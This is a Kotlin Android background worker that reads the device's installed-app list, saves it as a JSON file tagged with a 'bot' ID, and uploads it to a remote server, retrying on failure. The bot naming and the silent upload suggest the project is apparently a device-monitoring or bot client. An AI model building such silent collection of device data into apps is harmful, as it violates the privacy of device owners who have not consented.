package com.github.yohannestz.popov.worker

import android.content.Context
import android.util.Log
import androidx.hilt.work.HiltWorker
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.github.yohannestz.popov.data.local.ApplicationsRepository
import com.github.yohannestz.popov.data.model.Bot
import com.github.yohannestz.popov.data.remote.NetworkService
import com.google.gson.Gson
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.Calendar
import java.util.Date
import javax.inject.Inject

@HiltWorker
class AppsLogReportWorker @AssistedInject constructor(
    @Assisted private val context: Context,
    @Assisted workerParameters: WorkerParameters,
    private val applicationsRepository: ApplicationsRepository,
    private val networkService: NetworkService,
    private val bot: Bot
) : CoroutineWorker(context, workerParameters) {

/*    @Inject
    lateinit var applicationsRepository: ApplicationsRepository

    @Inject
    lateinit var networkService: NetworkService

    @Inject
    lateinit var bot: Bot*/

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val appList = applicationsRepository.getAllApps()
        Log.e("apps: ", "size -> ${appList.size}")
        val currentTime: Date = Calendar.getInstance().time

        val appFile = File(
            context.filesDir,
            "apps_${bot.botId}_${currentTime.time}.json"
        )
        val gson = Gson()

        val fileOutputStream = FileOutputStream(appFile)
        try {
            val jsonString = gson.toJson(appList)
            fileOutputStream.write(jsonString.toByteArray())
        } catch (ex: Exception) {
            ex.printStackTrace()
        } finally {
            fileOutputStream.close()
        }

        val requestBody = RequestBody.create(MediaType.parse("text/plain"), appFile)
        val fileToUpload =
            MultipartBody.Part.createFormData("sampleFile", appFile.name, requestBody)
        val filename = RequestBody.create(MediaType.parse("multipart/form-data"), appFile.name)
        val response = networkService.uploadFile(fileToUpload, filename).body()
        Log.e("response: ", response.toString())
        if (response!!.success) {
            Log.e("updatedDb: ", "apps are uploaded.")
        }
        return@withContext if (response.success) {
            Result.success()
        } else {
            Result.retry()
        }
    }
}